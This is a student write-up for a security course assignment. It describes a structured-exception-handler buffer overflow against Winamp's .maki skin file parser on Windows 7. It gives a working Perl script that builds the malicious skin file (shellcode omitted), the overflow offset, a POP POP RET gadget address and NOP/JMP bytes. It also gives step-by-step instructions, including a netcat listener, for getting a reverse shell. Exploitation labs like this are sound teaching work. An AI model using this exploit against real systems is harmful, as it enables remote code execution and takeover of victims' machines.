# CIS 751 Programming Assignment 4 (SEH Attack)
### Author: Chuck Zumbaugh
### Collaborators: None

## Objective and description of exploit
The objective of this exploit is to execute a buffer overflow attack on the Winamp program on Windows 7 and generate a reverse shell on the localhost. Winamp has various security features such as address space layout randomization (ASLR) and Stackguard built-in which complicates the exploit. Because ASLR randomizes stack addresses across executions, we cannot return to a specific address on the stack. Additionally, the buffer overflow will overwrite the canary and trigger an execption, so we cannot simply overwrite the saved EIP. Thus, our strategy will be to exploit the structured exception handlers (SEH) that are placed on the stack. When an exception is encountered, such as when the canary has been killed, the handlers are triggered and execution is diverted to the next handler in the SEH chain. The stack contains the pointer to the next SEH record followed by the address of the exception handler. To exploit this, we will overflow the buffer to trigger and exception, overwrite the pointer to the next SEH record with NOP NOP JMP 0x6 (`\x90\x90\xEB\x04`), overwrite the address of the handler with the address of POP EDI; POP ESI; RET;, followed by the shellcode. Execution will divert to the address of the exception handler and begin executing the POP EDI; POP ESI; RET. The machine word containing the address to the next SEH record is the third word from the top of the stack. The POP POP RET will pop the preceeding machine words from the stack, load the address to the pointer to the next SEH record to the EIP, and jump there. Since we have overwritten this with NOP NOP JMP 0x6, execution will jump over the handler address and begin executing our shellcode. 

## Exploit
Winamp contains a vulnerability when parsing the `.maki` skin files, in which we can trigger a buffer overflow. If the length is given as `\xFF\xFF`, a stack buffer overflow occurs and we can hijack the EIP. To exploit this, we simply need to install a malicious `.maki` file in a skin and run the Winamp program. We can generate the malicious file using the below Perl script (with the shellcode omitted for space).
```perl
#!/usr/bin/perl

binmode STDOUT;

$| = 1;

$length = "\xFF\xFF"; # Large value to trigger the overflow
$function_name = "\x41"x16756; # Junk to overflow the buffer, kill the canary, and trigger an exception
$nop_jmp = "\x90\x90\xEB\x04"; # What we want to overwrite the address to the next handler with 
$pop_ret = "\xfd\x1d\x34\x7c"; # Address to a POP POP RET instruction in one of the modules

$buf = "...Shellcode...";

my $maki =
"\x46\x47" .                              # Magic
"\x03\x04" .                              # Version
"\x17\x00\x00\x00" .                      # ???
"\x01\x00\x00\x00" .                      # Types count
"\x71\x49\x65\x51\x87\x0D\x51\x4A" .      # Types
"\x91\xE3\xA6\xB5\x32\x35\xF3\xE7" .

"\x01\x00\x00\x00".                       # Function count
"\x01\x01" .                              # Function 1
"\x00\x00" .                              # Dummy

$length .                                 # Length
$function_name .
$nop_jmp .
$pop_ret .
$buf;

print $maki;
```

## Length of the buffer
The length of the buffer, specifically the length of to the address of the SEH handler, was determined by using a 20,000 byte pattern in the `.maki` file. Analysis of the EIP during exception handling revealed an offset of 16,760 bytes. Thus, after passing 16,754 bytes the address to the next SEH record can be overwritten by the following 4 bytes, and the address to the exception handler can be overwritten by the following 4 bytes.

## Address of POP POP RET
The address of POP POP RET was found by searching the dynamically linked libraries compiled without ASLR or DEP for `5F 5E C3`. Specifically, the search `s 0x7c340000 L? 0x56000 5F 5E C3` generated a list of possible addresses, of which `0x7c341dfd` was selected.

## Executing the attack
For this example we will replace the `mcvcore.maki` file in the Bento skin with a malicious version. This can be done as follows:

1. Generate the malicious file by running `perl winamp_exploit.pl > mcvcore.maki`.
2. Replace the `mcvcore.maki` file in `Program Files\Winamp\Skins\Bento\scripts` with the generated malicious file. 
3. Setup a listener on localhost and port 8888 by running `nc -n 127.0.0.1 -lvp 8888`.
4. Open the Winamp program (and possibly switching to the Bento skin) and the listener should receive a reverse shell.

We should now have a reverse shell like the figure below

![Success](./reverse_shell.png)